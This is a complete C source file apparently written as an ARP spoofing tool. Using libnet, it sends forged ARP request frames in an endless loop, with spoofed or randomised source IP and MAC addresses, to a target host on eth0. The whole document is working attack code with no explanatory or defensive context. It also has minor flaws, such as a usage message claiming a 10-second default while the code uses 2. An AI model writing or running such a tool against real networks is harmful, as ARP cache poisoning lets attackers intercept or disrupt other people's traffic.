#include <libnet.h>

#define DEVICE "eth0"

int main(int argc, char *argv[])
{
  libnet_t *l;
  libnet_ptag_t eth_tag, arp_tag;
  char errbuf[LIBNET_ERRBUF_SIZE];
  u_long ipsrc, ipdst; 
  char iprnd[16], macsrcrnd[19];
  u_int8_t *macsrc, *macdst;
  int period = 2;
  int r;
    
  if(argc < 5) {
    fprintf(stderr, 
    "Usage: %s <(source ip)||(random)> <(source mac)||(random)> <destination ip> <destination mac> [period(default 10 sec.)]\n", argv[0]);
    exit(-1);
  }

  ipdst = inet_addr(argv[3]);
  macdst = libnet_hex_aton((int8_t*)argv[4], &r);
  
  if (argc == 6)
    period = atoi(argv[5]);

  while(1)
  {
    srandom(time(NULL));
    if(!strcmp(argv[1], "random"))
    {
      sprintf(iprnd, "%d.%d.%d.%d", random() % 255, random() % 255, random() % 255, random() % 255);
      ipsrc = inet_addr(iprnd);
    } else
      ipsrc = inet_addr(argv[1]);

    if(!strcmp(argv[2], "random"))
    {
      sprintf(macsrcrnd, "%x:%x:%x:%x:%x:%x", random() % 255, random() % 255, random() % 255, random() % 255, random() % 255, random() % 255);
      macsrc = libnet_hex_aton((int8_t*)macsrcrnd, &r);
    } else
      macsrc = libnet_hex_aton((int8_t*)argv[2], &r);


    l = libnet_init(LIBNET_LINK, DEVICE, errbuf);
    if (l == NULL) {
      fprintf(stderr, "Error opening context: %s", errbuf);
      exit(-1);
    }

    /* ARP header */
    arp_tag = libnet_build_arp( 
                1,              	/* hardware type */
                0x0800,         	/* proto type */
                6,              	/* hw addr size */
                4,              	/* proto addr size */ 
                1, 	            	/* ARP OPCODE */
                macsrc,         	/* source HW addr */
                (u_int8_t*)&ipsrc,      /* src proto addr */
                macdst,        		/* dst HW addr */
                (u_int8_t*)&ipdst,      /* dst IP addr */
                NULL,           	/* no payload */
                0,              	/* payload length */
                l,			/* libnet tag */
                0);			/* ptag see man */
		 
    if (arp_tag == -1) {
      fprintf(stderr,
           "Unable to build Ethernet header: %s\n", libnet_geterror(l));
      exit(-1);
    } 

    /* ethernet header */   
    eth_tag  = libnet_build_ethernet(
            	 macdst,         /* dst HW addr */
            	 macsrc,         /* src HW addr */
            	 ETHERTYPE_ARP,  /* ether packet type */
            	 NULL,           /* ptr to payload */
            	 0,              /* payload size */
            	 l,		 /* libnet tag */
            	 0);             /* ptr to packet memory */

    if (eth_tag == -1) {
      fprintf(stderr,
           "Unable to build Ethernet header: %s\n", libnet_geterror(l));
      exit(-1);
    }

    /* write the packet */ 
    if ((libnet_write(l)) == -1) {
      fprintf(stderr, "Unable to send packet: %s\n", libnet_geterror(l));
      exit(-1);
    }

    sleep(period);
  }

  /* exit cleanly */
  libnet_destroy(l);
  return 0;
}


